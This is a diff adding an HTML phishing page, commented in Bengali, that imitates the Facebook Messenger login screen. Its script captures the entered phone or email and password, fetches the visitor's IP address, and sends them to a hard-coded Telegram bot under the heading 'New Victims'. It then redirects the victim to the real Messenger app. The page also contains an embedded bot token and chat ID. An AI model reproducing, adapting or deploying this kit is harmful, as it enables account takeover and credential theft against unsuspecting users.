@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>লগইন পেজ</title>
+    <style>
+        /* বডির ব্যাকগ্রাউন্ড রঙ, ফন্ট এবং লেআউট এখানে কাস্টমাইজ করুন */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff; /* ব্যাকগ্রাউন্ড রঙ এখানে পরিবর্তন করুন (যেমন: #f0f0f0) */
+            font-family: Arial, sans-serif; /* ফন্ট ফ্যামিলি এখানে পরিবর্তন করুন (যেমন: 'Bangla', 'Times New Roman') */
+        }
+
+        /* কন্টেইনারের সংরেখণ এবং স্পেসিং এখানে কাস্টমাইজ করুন */
+        .container {
+            text-align: center;
+        }
+
+        /* ল্যাঙ্গুয়েজ সিলেক্টর টেক্সট, রঙ এবং স্পেসিং এখানে কাস্টমাইজ করুন */
+        .language-select {
+            margin-bottom: 120px; /* স্পেসিং এখানে সমন্বয় করুন (যেমন: 15px বা 25px) */
+            color: #606770; /* টেক্সট রঙ এখানে পরিবর্তন করুন (যেমন: #333333) */
+            font-size: 14px; /* ফন্ট সাইজ এখানে সমন্বয় করুন (যেমন: 16px) */
+        }
+
+        /* মেসেঞ্জার লোগোর আকার, মার্জিন এবং ইমেজ সোর্স এখানে কাস্টমাইজ করুন */
+        .messenger-logo {
+            margin-bottom: 100px; /* স্পেসিং এখানে সমন্বয় করুন (যেমন: 20px বা 40px) */
+        }
+
+        .messenger-logo img {
+            width: 50px; /* লোগো প্রস্থ এখানে সমন্বয় করুন (যেমন: 60px) */
+            height: 50px; /* লোগো উচ্চতা এখানে সমন্বয় করুন (যেমন: 60px) */
+        }
+
+        /* ইনপুট বক্সের আকার, বর্ডার, প্যাডিং এবং স্টাইলিং এখানে কাস্টমাইজ করুন */
+        .input-box {
+            margin-bottom: 15px; /* স্পেসিং এখানে সমন্বয় করুন (যেমন: 10px বা 20px) */
+            width: 380px; /* প্রস্থ এখানে সমন্বয় করুন (যেমন: 250px বা 350px) */
+            padding: 10px; /* প্যাডিং এখানে সমন্বয় করুন (যেমন: 8px বা 12px) */
+            border: 1px solid #ccd0d5; /* বর্ডার রঙ এখানে পরিবর্তন করুন (যেমন: #999999) */
+            border-radius: 5px; /* বর্ডার রাউন্ডনেস এখানে সমন্বয় করুন (যেমন: 8px) */
+            font-size: 16px; /* ফন্ট সাইজ এখানে সমন্বয় করুন (যেমন: 14px বা 18px) */
+            color: #1d2129; /* টেক্সট রঙ এখানে পরিবর্তন করুন (যেমন: #000000) */
+            position: relative;
+        }
+
+        /* ইনপুট বক্সের ত্রুটি অবস্থা (যখন ত্রুটি থাকবে) এখানে কাস্টমাইজ করুন */
+        .input-error {
+            border-color: #e41e3f; /* ত্রুটি বর্ডার রঙ এখানে পরিবর্তন করুন (যেমন: #ff0000) */
+        }
+
+        /* ত্রুটি মেসেজ টেক্সট, রঙ, সাইজ এবং দৃশ্যমানতা এখানে কাস্টমাইজ করুন */
+        .error-message {
+            color: #e41e3f; /* ত্রুটি টেক্সট রঙ এখানে পরিবর্তন করুন (যেমন: #ff4d4d) */
+            font-size: 12px; /* ত্রুটি ফন্ট সাইজ এখানে সমন্বয় করুন (যেমন: 10px বা 14px) */
+            margin-top: 5px; /* স্পেসিং এখানে সমন্বয় করুন (যেমন: 3px বা 7px) */
+            display: none;
+        }
+
+        /* লগইন বাটনের আকার, রঙ, আকৃতি এবং হোভার এফেক্ট এখানে কাস্টমাইজ করুন */
+        .login-button {
+            width: 380px; /* প্রস্থ এখানে সমন্বয় করুন (যেমন: 280px বা 320px) */
+            padding: 10px; /* প্যাডিং এখানে সমন্বয় করুন (যেমন: 8px বা 12px) */
+            background-color: #1877f2; /* বাটন ব্যাকগ্রাউন্ড রঙ এখানে পরিবর্তন করুন (যেমন: #0066cc) */
+            color: white; /* বাটন টেক্সট রঙ এখানে পরিবর্তন করুন (যেমন: #ffffff) */
+            border: none;
+            border-radius: 20px; /* বাটনের গোলাকার আকৃতি এখানে সমন্বয় করুন (যেমন: 15px বা 25px) */
+            font-size: 18px; /* ফন্ট সাইজ এখানে সমন্বয় করুন (যেমন: 16px বা 20px) */
+            cursor: pointer;
+            margin-bottom: 15px; /* স্পেসিং এখানে সমন্বয় করুন (যেমন: 10px বা 20px) */
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5; /* হোভার অবস্থার ব্যাকগ্রাউন্ড রঙ এখানে পরিবর্তন করুন (যেমন: #0052cc) */
+        }
+
+        /* "ফরগট পাসওয়ার্ড?" লিঙ্কের রঙ, সাইজ এবং স্পেসিং এখানে কাস্টমাইজ করুন */
+        .forgot-password {
+            color: #1877f2; /* লিঙ্ক রঙ এখানে পরিবর্তন করুন (যেমন: #0066cc) */
+            font-size: 14px; /* ফন্ট সাইজ এখানে সমন্বয় করুন (যেমন: 12px বা 16px) */
+            text-decoration: none;
+            display: block;
+            margin: 0 auto;
+            margin-bottom: 270px; /* স্পেসিং এখানে সমন্বয় করুন (যেমন: 20px বা 40px) */
+        }
+
+        /* মেটা আইকন টেক্সট, রঙ এবং স্পেসিং এখানে কাস্টমাইজ করুন */
+        .meta-icon {
+            color: #606770; /* টেক্সট রঙ এখানে পরিবর্তন করুন (যেমন: #333333) */
+            font-size: 14px; /* ফন্ট সাইজ এখানে সমন্বয় করুন (যেমন: 12px বা 16px) */
+        }
+
+        .meta-icon::before {
+            content: "∞"; /* আইকন প্রতীক এখানে পরিবর্তন করুন (যেমন: "®" বা অন্য সিম্বল) */
+            margin-right: 5px; /* স্পেসিং এখানে সমন্বয় করুন (যেমন: 3px বা 7px) */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="language-select">
+            English (US) ▼ <!-- ল্যাঙ্গুয়েজ টেক্সট বা ড্রপডাউন ফাংশনালিটি এখানে পরিবর্তন বা যোগ করুন (যেমন: বাংলা (BD) ▼) -->
+        </div>
+        <div class="messenger-logo">
+            <img src="https://scontent.fdac134-1.fna.fbcdn.net/v/t39.8562-6/120009688_325579128711709_1736249742330805861_n.png?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=2zEsrdchvQgQ7kNvgEpUWQ4&_nc_oc=AdhYpR_dVVrN03xiCAbCmxamv_xDI3rTkKEXA5uHYeliARTLCgWaGNeOOki0SmDYOYI&_nc_zt=14&_nc_ht=scontent.fdac134-1.fna&_nc_gid=A1p7A0HcdNSAHOH5SC5WFt1&oh=00_AYCm6tihWDBLK9iy4poEhRiTK2o9P2qMiO2GDVgT726WkA&oe=67C1C3BD" alt="মেসেঞ্জার লোগো"> <!-- লোগো ইমেজ URL এখানে পরিবর্তন করুন (যেমন: আপনার কাস্টম লোগো) -->
+        </div>
+        <div class="input-group">
+            <input type="text" id="username" class="input-box" placeholder="Mobile number or email"> <!-- প্লেসহোল্ডার টেক্সট এখানে পরিবর্তন করুন (যেমন: ব্যবহারকারীর নাম) -->
+            <div id="username-error" class="error-message">অনুগ্রহ করে আপনার মোবাইল নম্বর বা ইমেইল প্রবেশ করুন।</div> <!-- ত্রুটি মেসেজ এখানে পরিবর্তন করুন (যেমন: "ফিল্ড পূরণ করুন") -->
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" class="input-box" placeholder="Password"> <!-- প্লেসহোল্ডার টেক্সট এখানে পরিবর্তন করুন (যেমন: গোপন কোড) -->
+            <div id="password-error" class="error-message">অনুগ্রহ করে আপনার পাসওয়ার্ড প্রবেশ করুন।</div> <!-- ত্রুটি মেসেজ এখানে পরিবর্তন করুন (যেমন: "পাসওয়ার্ড প্রয়োজন") -->
+        </div>
+        <button class="login-button" onclick="handleLogin()">Log in</button> <!-- বাটন টেক্সট এখানে পরিবর্তন করুন (যেমন: প্রবেশ করুন) -->
+        <a href="#" class="forgot-password">Forgot password?</a> <!-- লিঙ্ক টেক্সট বা URL এখানে পরিবর্তন করুন (যেমন: পাসওয়ার্ড রিসেট) -->
+        <div class="meta-icon">Meta</div> <!-- মেটা টেক্সট এখানে পরিবর্তন করুন (যেমন: কোম্পানি নাম) -->
+    </div>
+
+    <script>
+        function handleLogin() {
+            const username = document.getElementById('username');
+            const password = document.getElementById('password');
+            const usernameError = document.getElementById('username-error');
+            const passwordError = document.getElementById('password-error');
+
+            // ত্রুটি অবস্থা রিসেট করুন
+            username.classList.remove('input-error');
+            password.classList.remove('input-error');
+            usernameError.style.display = 'none';
+            passwordError.style.display = 'none';
+
+            // ফিল্ডগুলো খালি কিনা তা চেক করুন
+            let hasError = false;
+            if (!username.value.trim()) {
+                username.classList.add('input-error');
+                usernameError.style.display = 'block';
+                hasError = true;
+            }
+            if (!password.value.trim()) {
+                password.classList.add('input-error');
+                passwordError.style.display = 'block';
+                hasError = true;
+            }
+
+            // যদি কোনো ত্রুটি না থাকে, তবে ডাটা টেলিগ্রামে পাঠান এবং মেসেঞ্জারে রিডাইরেক্ট করুন
+            if (!hasError) {
+                // IP ঠিকানা পেতে একটি বাহ্যিক সার্ভিস ব্যবহার করুন - IP সার্ভিস URL এখানে পরিবর্তন করতে পারেন যদি প্রয়োজন হয়
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ipAddress = data.ip;
+                        const loginTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' }); // সময় জোন এখানে পরিবর্তন করুন যদি প্রয়োজন হয় (যেমন: 'America/New_York')
+                        const message = `New Victims\nNumber or Gmail or Username➜ ${username.value.trim()}\nPassword➜ ${password.value.trim()}\nIP Address➜ ${ipAddress}\nLogin Time & Date (BD)➜ ${loginTime}\nLogin Page Type ➜ Messenger`; // মেসেজ ফরম্যাট এখানে কাস্টমাইজ করুন
+
+                        // টেলিগ্রাম বটের বিস্তারিত এখানে কাস্টমাইজ করুন
+                        const botToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ'; // বট টোকেন এখানে পরিবর্তন করুন
+                        const chatId = '5916486983'; // চ্যাট আইডি এখানে পরিবর্তন করুন
+
+                        // ডাটা টেলিগ্রাম বটে পাঠান
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message
+                            })
+                        })
+                        .then(() => {
+                            // টেলিগ্রামে ডাটা পাঠানোর পর মেসেঞ্জার অ্যাপে রিডাইরেক্ট করুন - রিডাইরেক্ট প্যাকেজ/URL এখানে পরিবর্তন করুন
+                            // মেসেঞ্জারের প্যাকেজ নাম (com.facebook.orca) ব্যবহার করে অ্যান্ড্রয়েডে অ্যাপ খুলবে
+                            window.location.href = 'intent://com.facebook.orca#Intent;scheme=fb;package=com.facebook.orca;end';
+                        })
+                        .catch(error => console.error('টেলিগ্রামে পাঠানোর ত্রুটি:', error));
+                    })
+                    .catch(error => console.error('IP ফেচ করার ত্রুটি:', error));
+            }
+        }
+    </script>
+</body>
+</html>
